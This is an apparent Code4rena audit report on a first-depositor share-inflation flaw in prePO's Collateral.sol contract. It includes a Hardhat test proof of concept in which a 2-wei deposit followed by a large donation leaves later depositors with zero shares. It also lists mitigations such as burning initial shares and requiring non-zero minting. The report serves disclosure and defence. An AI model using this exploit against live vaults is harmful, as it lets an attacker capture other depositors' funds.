## Vulnerability Title

[H-02] First depositor can break minting of shares

### Overview


This bug report is about a vulnerability in the Collateral.sol contract, which is part of the 2022-03-prepo project hosted on Github. The vulnerability allows an attacker to manipulate the total asset amount and prevent other users from receiving shares in exchange for their deposits. A proof of concept for this attack vector is provided in the report.

The report also provides recommended mitigation steps to help prevent this vulnerability from being exploited. These steps include sending the first 1000 LP tokens to the zero address when the total supply is 0, ensuring the number of shares to be minted is non-zero, creating a periphery contract that atomically calls both the initialize and deposit functions, and calling the deposit function once in the initialize function.

In conclusion, this bug report outlines a vulnerability in the Collateral.sol contract and provides recommended mitigation steps to help prevent it from being exploited.

[Collateral.sol#L82-L91](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L82-L91)<br>

The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719\_ToB_yearn_vaultsv2/ToB\_-\_Yearn_Vault_v\_2\_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.

### Proof of Concept

*   Attacker deposits 2 wei (so that it is greater than min fee) to mint 1 share
*   Attacker transfers exorbitant amount to `_strategyController` to greatly inflate the share’s price. Note that the `_strategyController` deposits its entire balance to the strategy when its `deposit()` function is called.
*   Subsequent depositors instead have to deposit an equivalent sum to avoid minting 0 shares. Otherwise, their deposits accrue to the attacker who holds the only share.

```jsx
it("will cause 0 share issuance", async () => {
	// 1. first user deposits 2 wei because 1 wei will be deducted for fee
	let firstDepositAmount = ethers.BigNumber.from(2)
	await transferAndApproveForDeposit(
	    user,
	    collateral.address,
	    firstDepositAmount
	)
	
	await collateral
	    .connect(user)
	    .deposit(firstDepositAmount)
	
	// 2. do huge transfer of 1M to strategy to controller
	// to greatly inflate share price
	await baseToken.transfer(strategyController.address, ethers.utils.parseEther("1000000"));
	
	// 3. deployer tries to deposit reasonable amount of 10_000
	let subsequentDepositAmount = ethers.utils.parseEther("10000");
	await transferAndApproveForDeposit(
	    deployer,
	    collateral.address,
	    subsequentDepositAmount
	)

	await collateral
	    .connect(deployer)
	    .deposit(subsequentDepositAmount)
	
	// receives 0 shares in return
	expect(await collateral.balanceOf(deployer.address)).to.be.eq(0)
});
```

### Recommended Mitigation Steps

*   [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution.
*   Ensure the number of shares to be minted is non-zero: `require(_shares != 0, "zero shares minted");`
*   Create a periphery contract that contains a wrapper function that atomically calls `initialize()` and `deposit()`
*   Call `deposit()` once in `initialize()` to achieve the same effect as the suggestion above.
